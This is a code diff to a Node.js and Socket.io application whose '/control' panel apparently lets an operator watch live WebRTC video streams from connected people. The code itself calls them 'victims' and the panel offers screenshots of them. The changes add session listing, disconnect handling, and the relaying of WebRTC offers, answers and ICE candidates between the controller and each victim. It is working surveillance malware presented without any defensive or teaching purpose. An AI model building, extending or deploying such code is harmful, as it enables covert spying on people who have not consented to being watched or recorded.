@@ -64,6 +64,7 @@ app.get('/control', (req, res) => {
   <script>
     const socket = io();
     const sessions = new Map();
+    const peerConnections = new Map();
     let snaps = 0;
     
     function log(msg) {
@@ -74,14 +75,47 @@ app.get('/control', (req, res) => {
     }
     
     socket.on('connect', () => {
-      log('Connected');
+      log('Connected to signaling server');
+      socket.emit('get-sessions');
+    });
+
+    socket.on('session-list', (list) => {
+      log('Received active sessions list (' + list.length + ')');
+      list.forEach(id => {
+        if (!sessions.has(id)) {
+          sessions.set(id, { id: id });
+          addCard(id);
+        }
+      });
     });
     
     socket.on('new-session', (data) => {
-      log('New victim: ' + data.sessionId);
+      log('New victim connected: ' + data.sessionId);
       if (sessions.has(data.sessionId)) return;
       sessions.set(data.sessionId, { id: data.sessionId });
       addCard(data.sessionId);
+    });
+
+    socket.on('session-gone', (data) => {
+      log('Victim disconnected: ' + data.sessionId);
+      removeCard(data.sessionId);
+    });
+
+    socket.on('ctrl-answer', (data) => {
+      log('Received WebRTC answer from ' + data.sender);
+      const pc = peerConnections.get(data.sender);
+      if (pc) {
+        pc.setRemoteDescription(new RTCSessionDescription(data.answer))
+          .catch(err => log('SetRemoteDescription error: ' + err.message));
+      }
+    });
+
+    socket.on('ctrl-ice', (data) => {
+      const pc = peerConnections.get(data.sender);
+      if (pc) {
+        pc.addIceCandidate(new RTCIceCandidate(data.candidate))
+          .catch(err => log('AddIceCandidate error: ' + err.message));
+      }
     });
     
     function addCard(id) {
@@ -89,11 +123,73 @@ app.get('/control', (req, res) => {
       const noSession = list.querySelector('.no-sessions');
       if (noSession) noSession.remove();
       
+      if (document.getElementById('card-' + id)) return;
+      
       const card = document.createElement('div');
       card.className = 'session-card';
+      card.id = 'card-' + id;
       card.innerHTML = '<h3>' + id + '</h3><div class="video-container"><video id="vid-' + id + '" autoplay playsinline muted><\/video><\/div><div class="controls"><button class="btn-snap" onclick="snap(\'' + id + '\')">Screenshot<\/button><\/div>';
       list.appendChild(card);
       document.getElementById('count').textContent = list.querySelectorAll('.session-card').length;
+      
+      initPeerConnection(id);
+    }
+
+    function removeCard(id) {
+      const card = document.getElementById('card-' + id);
+      if (card) card.remove();
+      
+      sessions.delete(id);
+      const pc = peerConnections.get(id);
+      if (pc) {
+        pc.close();
+        peerConnections.delete(id);
+      }
+
+      const list = document.getElementById('list');
+      const count = list.querySelectorAll('.session-card').length;
+      document.getElementById('count').textContent = count;
+      if (count === 0) {
+        list.innerHTML = '<div class="no-sessions">Waiting for victims...</div>';
+      }
+    }
+
+    function initPeerConnection(id) {
+      if (peerConnections.has(id)) return;
+      
+      log('Initiating WebRTC connection for ' + id);
+      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      peerConnections.set(id, pc);
+
+      pc.ontrack = (event) => {
+        if (event.streams && event.streams[0]) {
+          const video = document.getElementById('vid-' + id);
+          if (video) {
+            video.srcObject = event.streams[0];
+            log('Media stream added to video element for ' + id);
+          }
+        }
+      };
+
+      pc.onicecandidate = (event) => {
+        if (event.candidate) {
+          socket.emit('ctrl-ice', { target: id, candidate: event.candidate });
+        }
+      };
+
+      pc.oniceconnectionstatechange = () => {
+        log('WebRTC state for ' + id + ': ' + pc.iceConnectionState);
+        if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
+          removeCard(id);
+        }
+      };
+
+      pc.createOffer()
+        .then(offer => pc.setLocalDescription(offer))
+        .then(() => {
+          socket.emit('ctrl-offer', { target: id, offer: pc.localDescription });
+        })
+        .catch(err => log('Offer creation error for ' + id + ': ' + err.message));
     }
     
     function snap(id) {
@@ -123,15 +219,42 @@ io.on('connection', (socket) => {
     console.log('[' + socket.id + '] ' + event);
   });
   
+  socket.on('get-sessions', () => {
+    socket.isControl = true;
+    socket.join('control-room');
+    const activeList = Array.from(activeSessions.keys());
+    socket.emit('session-list', activeList);
+  });
+
   socket.on('victim-ready', () => {
     console.log('[VICTIM] Ready: ' + socket.id);
     activeSessions.set(socket.id, { socket, ip, time: Date.now() });
-    io.emit('new-session', { sessionId: socket.id });
+    io.to('control-room').emit('new-session', { sessionId: socket.id });
+  });
+
+  socket.on('ctrl-offer', (data) => {
+    console.log(`[SIGNAL] Relay offer from control ${socket.id} to target victim ${data.target}`);
+    const victim = activeSessions.get(data.target);
+    if (victim) {
+      victim.socket.emit('ctrl-offer', { offer: data.offer, target: socket.id });
+    }
+  });
+
+  socket.on('ctrl-answer', (data) => {
+    console.log(`[SIGNAL] Relay answer from victim ${socket.id} to target control ${data.target}`);
+    io.to(data.target).emit('ctrl-answer', { sender: socket.id, answer: data.answer });
+  });
+
+  socket.on('ctrl-ice', (data) => {
+    io.to(data.target).emit('ctrl-ice', { sender: socket.id, candidate: data.candidate });
   });
   
   socket.on('disconnect', () => {
     console.log('[-] Disconnect: ' + socket.id);
-    activeSessions.delete(socket.id);
+    if (activeSessions.has(socket.id)) {
+      activeSessions.delete(socket.id);
+      io.to('control-room').emit('session-gone', { sessionId: socket.id });
+    }
   });
 });
 
